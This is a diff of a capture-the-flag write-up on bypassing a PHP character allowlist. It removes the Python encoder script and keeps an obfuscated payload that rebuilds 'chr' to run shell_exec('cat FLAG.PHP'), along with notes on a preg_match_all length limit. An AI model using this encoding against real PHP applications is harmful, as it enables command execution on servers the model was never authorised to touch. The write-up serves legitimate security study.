@@ -43,57 +43,7 @@ Once we have all this set up, we can try reading `FLAG.PHP`. I tried using the `
 
 To perform the actual encoding, I wrote a Python script. At first, I used the most straighforward method of first obtaining the string `"chr"` using the incrementing method on a counter variable, then representing every character as `("chr")(1+1+1+...+1)` where each `1` is `([]==[])`. This resulted in very long generated code. When I tried submitting it, it would fail with an error, even though the code only contained the allowed characters. Upon further experimentation, it turned out that the `preg_match_all` function silently fails if the input is over 2047 characters long. So I needed to make the script more sophisticated to optimize the size of the generated code. In the end, I decided to create variables holding the powers of 2. Each variable is the sum of two of the previous one, and the first one is `[]==[]`. Then any character code can be represented efficiently as the sum of certain powers of 2. This allowed the code size to be well within the limit, and I obtained the flag. It turned out that `FLAG.PHP` had the flag inside a HTML comment, so I couldn't see it on the page at first and had to open developer tools to see it.
 
-Here is the script:
-```python
-allowed = '$()_[]=;+".'
-
-def var(n: int) -> str:
-    return '$' + '_' * n
-
-ctr = var(1)
-c_ = var(3)
-h_ = var(4)
-chr_ = var(1)
-
-bin_limit = 7
-
-def bin_num(k: int) -> str:
-    return var(k + 2)
-
-one = bin_num(0)
-
-def encode_num(n: int) -> str:
-    return '+'.join(bin_num(k) for k in range(bin_limit) if (1 << k) & n)
-
-def inc(n: int) -> str:
-    return f'{ctr}++;' * n
-
-def inc_diff(c1: str, c2: str) -> str:
-    return inc(ord(c2) - ord(c1))
-
-header = (f'{one}=[]==[];\
-{ctr}=([].[])[{one}+{one}+{one}];\
-{inc_diff("a", "c")}\
-{c_}={ctr};\
-{inc_diff("c", "h")}\
-{h_}={ctr};\
-{inc_diff("h", "r")}\
-{chr_}={c_}.{h_}.{ctr};'
-+ ''.join(f'{bin_num(k)}={bin_num(k-1)}+{bin_num(k-1)};' for k in range(1, bin_limit)))
-
-def encode_char(c: str) -> str:
-    if c in allowed and c != '"':
-        return '"' + c + '"'
-    return f'{chr_}({encode_num(ord(c))})'
-
-def encode_str(s: str) -> str:
-    return '(' + '.'.join(map(encode_char, s)) + ')'
-
-encoded = header + f'{encode_str("print_r")}({encode_str("shell_exec")}{encode_str("cat FLAG.PHP")});'
-assert all(c in allowed for c in encoded)
-print(encoded)
-```
-and the output is
+The output of the script is:
 ```
 $__=[]==[];$_=([].[])[$__+$__+$__];$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$____=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$____.$_;$___=$__+$__;$____=$___+$___;$_____=$____+$____;$______=$_____+$_____;$_______=$______+$______;$________=$_______+$_______;($_($______+$_______+$________).$_($___+$______+$_______+$________).$_($__+$_____+$_______+$________).$_($___+$____+$_____+$_______+$________).$_($____+$______+$_______+$________)."_".$_($___+$______+$_______+$________))(($_($__+$___+$______+$_______+$________).$_($_____+$_______+$________).$_($__+$____+$_______+$________).$_($____+$_____+$_______+$________).$_($____+$_____+$_______+$________)."_".$_($__+$____+$_______+$________).$_($_____+$______+$_______+$________).$_($__+$____+$_______+$________).$_($__+$___+$_______+$________))($_($__+$___+$_______+$________).$_($__+$_______+$________).$_($____+$______+$_______+$________).$_($_______).$_($___+$____+$________).$_($____+$_____+$________).$_($__+$________).$_($__+$___+$____+$________).".".$_($______+$________).$_($_____+$________).$_($______+$________)));
 ```
